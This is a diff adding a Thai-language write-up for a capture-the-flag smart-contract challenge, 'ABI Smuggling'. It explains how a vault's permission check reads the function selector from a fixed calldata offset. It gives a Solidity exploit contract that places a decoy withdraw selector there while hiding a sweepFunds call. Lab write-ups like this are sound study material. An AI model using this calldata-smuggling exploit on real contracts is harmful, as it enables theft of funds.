@@ -418,3 +418,50 @@ by tinamints
     }
 `
 
+## 15. ABI Smuggling
+### เงื่อนไข :
+- ดึงเหรียญ DVT ทั้ง 1 ล้านจาก vault ไปยัง recovery
+### คอนเซ็ป :
+-  ABI smuggling
+-  การปลอมตำแหน่ง offset ใน calldata
+### วิธีแก้ :
+- `execute()` เช็คสิทธิ์โดยอ่าน selector จากตำแหน่ง calldata ที่ hardcode ไว้ (byte ที่ 100) ไม่ได้อ่านจากตำแหน่งจริงของ `actionData` เราจึงสร้าง calldata ที่วาง selector ของ `withdraw` (ซึ่งผู้เล่นมีสิทธิ์เรียก) ไว้ที่ byte 100 เป็นตัวหลอก ในขณะที่ตัว offset จริงชี้ไปยังข้อมูลที่ซ่อนอยู่ไกลออกไป ซึ่งเป็น payload ของ `sweepFunds` (ที่ผู้เล่นไม่มีสิทธิ์เรียก) ทำให้ระบบตรวจสอบสิทธิ์ผ่านจากตัวหลอก แต่ vault กลับไปรัน action ที่ถูกซ่อนไว้จริง
+### POC
+` function test_abiSmuggling() public checkSolvedByPlayer {
+         Exploit exploit = new Exploit(address(vault),address(token),recovery);
+        bytes memory payload = exploit.executeExploit();
+        address(vault).call(payload);
+    }`
+
+`contract Exploit {
+    function executeExploit() external returns (bytes memory) {
+        bytes4 executeSelector = vault.execute.selector;
+        bytes memory target = abi.encodePacked(bytes12(0), address(vault));
+        bytes memory dataOffset = abi.encodePacked(uint256(0x80));
+        bytes memory emptyData = abi.encodePacked(uint256(0));
+        bytes memory withdrawSelectorPadded = abi.encodePacked(
+            bytes4(0xd9caed12),
+            bytes28(0)
+        );
+        bytes memory sweepFundsCalldata = abi.encodeWithSelector(
+            vault.sweepFunds.selector,
+            recovery,
+            token
+        );
+        uint256 actionDataLengthValue = sweepFundsCalldata.length;
+        bytes memory actionDataLength = abi.encodePacked(uint256(actionDataLengthValue));
+
+        bytes memory calldataPayload = abi.encodePacked(
+            executeSelector,
+            target,
+            dataOffset,
+            emptyData,
+            withdrawSelectorPadded,
+            actionDataLength,
+            sweepFundsCalldata
+        );
+
+        return calldataPayload;
+    }
+}`
+
